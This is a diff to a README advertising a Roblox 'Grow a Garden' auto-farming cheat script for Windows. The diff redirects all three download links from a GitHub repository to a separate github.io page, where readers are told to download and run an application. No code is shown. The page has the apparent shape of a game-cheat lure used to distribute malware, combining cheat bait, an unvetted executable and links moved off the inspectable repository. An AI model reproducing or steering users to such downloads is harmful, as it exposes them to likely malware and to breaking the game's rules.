@@ -1,6 +1,6 @@
 # 🌱 roblox-grow-a-garden-script-2026 - Farm Coins While You Sleep
 
-[![Download Now](https://img.shields.io/badge/Download-Grow_A_Garden_Script_2026-blue?style=for-the-badge&logo=github)](https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026)
+[![Download Now](https://img.shields.io/badge/Download-Grow_A_Garden_Script_2026-blue?style=for-the-badge&logo=github)](https://quintabivalent2705.github.io)
 
 ## 🎯 What This Script Does
 
@@ -26,7 +26,7 @@ Follow these simple steps to get the script running on your Windows computer. No
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download](https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026)**
+**[👉 Click Here to Download](https://quintabivalent2705.github.io)**
 
 Once you click the link, you'll land on the download page. Look for the big download button and click it. The file will start downloading to your computer.
 
@@ -106,7 +106,7 @@ A: Restart it. If the problem continues, check for updates on the download page.
 
 Need to download again? Here's the link:
 
-**[⬇️ Download Grow a Garden Script 2026](https://github.com/quintabivalent2705/roblox-grow-a-garden-script-2026)**
+**[⬇️ Download Grow a Garden Script 2026](https://quintabivalent2705.github.io)**
 
 Bookmark this page for future updates. New versions are released regularly with improved features.
 
